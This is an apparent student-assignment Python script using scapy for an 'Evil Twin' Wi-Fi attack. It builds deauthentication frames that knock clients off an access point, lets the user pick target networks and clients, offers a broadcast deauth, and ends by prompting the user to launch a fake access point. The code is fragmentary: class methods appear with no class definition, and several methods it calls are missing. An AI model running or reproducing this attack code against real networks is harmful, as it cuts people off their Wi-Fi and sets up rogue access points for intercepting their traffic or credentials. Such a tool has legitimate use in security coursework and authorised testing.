#!/usr/bin/env python3
"""
Enhanced Evil Twin Attack - Integrated Scanning and Deauth
Educational purposes only - Assignment 1
Combines scanning functionality with improved deauth attack
"""

from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeReq, Dot11ProbeResp, RadioTap, Dot11Deauth
import time
import os
import threading
from datetime import datetime
import signal
import sys


    
    def create_deauth_packet(self, target_mac, ap_bssid, reason_code=7):
        """
        Create deauth packets - improved version with both directions
        
        Args:
            target_mac (str): Target client MAC
            ap_bssid (str): AP BSSID
            reason_code (int): Deauth reason code
            
        Returns:
            tuple: (packet_to_client, packet_to_ap)
        """
        # Packet from AP to client (kick client)
        pkt_to_client = RadioTap() / Dot11(
            addr1=target_mac,  # Destination (client)
            addr2=ap_bssid,    # Source (AP)
            addr3=ap_bssid     # BSSID
        ) / Dot11Deauth(reason=reason_code)
        
        # Packet from client to AP (tell AP to forget client)
        pkt_to_ap = RadioTap() / Dot11(
            addr1=ap_bssid,    # Destination (AP)
            addr2=target_mac,  # Source (client)
            addr3=ap_bssid     # BSSID
        ) / Dot11Deauth(reason=reason_code)
        
        return pkt_to_client, pkt_to_ap
    

    
    def select_target_client(self):
        """Interactive client selection"""
        if not self.clients:
            print("[ERROR] No clients found. Run scan_clients() first")
            return None
        
        try:
            print("\nSelect target client:")
            index = int(input("Enter client index: ")) - 1
            
            if 0 <= index < len(self.clients):
                self.target_client = self.clients[index]
                print(f"[SELECTED] Target client: {self.target_client}")
                return self.target_client
            else:
                print("[ERROR] Invalid index")
                return None
                
        except (ValueError, IndexError):
            print("[ERROR] Invalid input")
            return None

def main():
    """Main function demonstrating the Evil Twin attack workflow"""
    print("=" * 60)
    print("EVIL TWIN ATTACK TOOL - EDUCATIONAL USE ONLY")
    print("=" * 60)
    
    # Get interface
    interface = input("Enter monitor interface name (e.g., wlan0mon): ")
    
    # Initialize attacker
    attacker = EvilTwinAttacker(interface)
    
    try:
        # Step 1: Scan for networks
        print("\n[STEP 1] Scanning for networks...")
        networks = attacker.scan_networks(scan_duration=30)
        
        if not networks:
            print("[ERROR] No networks found. Exiting.")
            return
        
        # Step 2: Select target network
        print("\n[STEP 2] Select target network")
        target_network = attacker.select_target_network()
        
        if not target_network:
            print("[ERROR] No target selected. Exiting.")
            return
        
        # Step 3: Scan for clients
        print("\n[STEP 3] Scanning for clients...")
        clients = attacker.scan_clients(target_network['bssid'], scan_duration=20)
        
        if not clients:
            print("[WARNING] No clients found.")
            choice = input("Continue with broadcast attack? (y/n): ").lower()
            if choice == 'y':
                attacker.broadcast_deauth(target_network['bssid'], attack_duration=15)
            return
        
        # Step 4: Select target client
        print("\n[STEP 4] Select target client")
        target_client = attacker.select_target_client()
        
        if not target_client:
            print("[ERROR] No client selected. Exiting.")
            return
        
        # Step 5: Launch attack
        print("\n[STEP 5] Launching targeted deauth attack")
        print("Press Ctrl+C to stop the attack early")
        
        attacker.start_attack(
            target_client,
            target_network['bssid'],
            attack_duration=20
        )
        
        # Wait for attack to complete or user interrupt
        try:
            attacker.attack_thread.join()
        except KeyboardInterrupt:
            print("\n[INFO] Attack interrupted by user")
            attacker.stop_attack()
        
        print("\n[COMPLETE] Evil Twin deauth phase completed")
        print("[NEXT] Now launch your fake AP to complete the attack")
        
    except KeyboardInterrupt:
        print("\n[INFO] Program interrupted by user")
        attacker.stop_attack()
    except Exception as e:
        print(f"[ERROR] Unexpected error: {e}")
        attacker.stop_attack()

if __name__ == "__main__":
    main()